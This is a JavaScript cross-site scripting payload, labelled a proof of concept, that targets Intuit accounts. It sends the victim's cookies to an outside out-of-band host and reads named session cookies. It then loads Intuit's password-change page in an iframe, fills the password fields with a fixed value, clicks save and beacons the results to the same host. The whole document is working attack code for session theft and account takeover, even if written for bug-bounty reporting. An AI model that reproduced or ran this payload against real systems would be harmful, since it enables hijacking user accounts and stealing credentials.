(async function(){
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var log=[];

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}

(new Image).src=O+'/xss-cookies?c='+encodeURIComponent(document.cookie);

log.push('origin: '+location.origin);
log.push('session: '+gc('ius_session'));
log.push('userId: '+gc('userIdentifier'));

document.body.innerHTML='<div id="status" style="font:14px monospace;background:#111;color:#0f0;padding:20px">Loading password page in iframe...</div>';

var iframe=document.createElement('iframe');
iframe.style.cssText='width:100%;height:500px;border:1px solid #333;margin-top:10px';
iframe.src='https://accounts.intuit.com/app/account-manager/security/password';
document.body.appendChild(iframe);

iframe.onload=function(){
log.push('iframe loaded');
var tries=0;
var maxTries=20;

var interval=setInterval(function(){
tries++;
try{
var doc=iframe.contentDocument||iframe.contentWindow.document;
var inputs=doc.querySelectorAll('input[type="password"],input[name*="password"],input[name*="Password"]');
log.push('try '+tries+': found '+inputs.length+' password inputs');

if(inputs.length>=2){
clearInterval(interval);
log.push('found password fields, filling...');

var setter=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;

for(var i=0;i<inputs.length;i++){
setter.call(inputs[i],'Poc@2027');
inputs[i].dispatchEvent(new Event('input',{bubbles:true}));
inputs[i].dispatchEvent(new Event('change',{bubbles:true}));
inputs[i].dispatchEvent(new Event('blur',{bubbles:true}));
}

log.push('fields filled, looking for save button...');

setTimeout(function(){
var doc2=iframe.contentDocument||iframe.contentWindow.document;
var btns=doc2.querySelectorAll('button');
var saveBtn=null;
for(var j=0;j<btns.length;j++){
var txt=btns[j].textContent.toLowerCase();
if(txt.indexOf('save')!==-1||txt.indexOf('update')!==-1||txt.indexOf('submit')!==-1){
saveBtn=btns[j];break
}
}
if(!saveBtn){
var submits=doc2.querySelectorAll('button[type="submit"]');
if(submits.length) saveBtn=submits[0];
}

if(saveBtn){
log.push('clicking save: "'+saveBtn.textContent.trim()+'"');
saveBtn.click();

setTimeout(function(){
log.push('done - check if password changed');
(new Image).src=O+'/xss-pwd-done?log='+encodeURIComponent(log.join('|'));
document.getElementById('status').innerHTML='<h1 style="color:red">XSS PoC — Password Change Attempted</h1>'
+'<pre style="color:#0f0">'+log.join('\n')+'</pre>'
+'<p style="color:yellow">New password: <b>Poc@2027</b></p>'
+'<p style="color:#ccc">Check below iframe for result. Try logging in with new password.</p>'
},3000);
}else{
log.push('no save button found');
var allBtns=[];
for(var k=0;k<btns.length;k++) allBtns.push(btns[k].textContent.trim());
log.push('buttons found: '+JSON.stringify(allBtns));
document.getElementById('status').innerHTML='<pre style="color:orange">'+log.join('\n')+'</pre>';
(new Image).src=O+'/xss-no-btn?btns='+encodeURIComponent(allBtns.join(','));
}
},500);

}else if(tries>=maxTries){
clearInterval(interval);
log.push('timeout waiting for password inputs');
var html=doc.body?doc.body.innerHTML.substring(0,500):'empty';
log.push('page content: '+html);
document.getElementById('status').innerHTML='<pre style="color:red">'+log.join('\n')+'</pre>';
(new Image).src=O+'/xss-timeout?log='+encodeURIComponent(log.join('|').substring(0,1000));
}
}catch(e){
log.push('try '+tries+' error: '+e.message);
if(tries>=maxTries){
clearInterval(interval);
document.getElementById('status').innerHTML='<pre style="color:red">'+log.join('\n')+'</pre>';
}
}
},500);
};

iframe.onerror=function(){
log.push('iframe load error');
document.getElementById('status').innerHTML='<pre style="color:red">'+log.join('\n')+'</pre>';
};
})();
